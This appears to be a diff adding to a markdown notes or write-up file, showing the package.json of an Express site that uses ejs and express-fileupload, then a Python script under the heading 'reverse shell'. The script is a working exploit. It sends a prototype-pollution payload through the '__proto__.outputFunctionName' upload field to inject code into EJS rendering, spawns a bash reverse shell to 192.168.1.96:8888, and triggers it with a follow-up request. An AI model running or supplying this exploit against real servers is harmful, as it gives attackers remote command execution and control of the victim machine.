@@ -79,4 +79,51 @@ server.listen(port, addr, () => {
 });
 ```
 
+cat package.json
+
+```
+{
+  "name": "some-website",
+  "version": "1.0.0",
+  "description": "",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "author": "",                                                                                                                                                                                                                              
+  "license": "ISC",
+  "dependencies": {
+    "ejs": "^3.1.5",
+    "express": "^4.17.1",
+    "express-fileupload": "^1.1.7-alpha.3"
+  }
+}
+
+```
+
+---
+## User
+
+
+
+
+reverse shell
+
+```
+### imports
+import requests
+
+### commands to run on victim machine
+cmd = 'bash -c "bash -i &> /dev/tcp/192.168.1.96/8888 0>&1"'
+
+print("Starting Attack...")
+### pollute
+requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName':(None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})
+
+### execute command
+requests.get('http://127.0.0.1:8080')
+print("Finished!")
+
+```
+
 
